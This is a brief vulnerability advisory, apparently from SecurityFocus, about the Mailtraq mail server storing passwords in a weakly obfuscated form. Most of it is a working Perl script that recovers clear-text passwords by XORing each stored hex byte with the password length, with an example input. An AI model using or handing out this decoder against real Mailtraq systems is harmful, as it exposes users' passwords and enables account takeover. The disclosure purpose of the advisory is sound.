source: http://www.securityfocus.com/bid/7923/info

It has been reported that Mailtraq does not securely store passwords. Because of this, an attacker may have an increased chance at gaining access to clear text passwords. 

#!/usr/bin/perl 

$Password = $ARGV[0]; 

print "Passwords should be something like: \\3D66656463626160\n"; 
print "Provided password: $Password\n"; 

$Password = substr($Password, 3); 
$Length = length($Password)/2; 

print "Length: $Length\n"; 

for ($i = 0; $i < $Length; $i++) 
{ 
 print "Decoding: ", substr($Password, $i*2, 2), " = "; 
 $ord = hex(substr($Password, $i*2, 2)); 

 print $ord^$Length, " (", chr($ord^$Length), ")\n"; 
}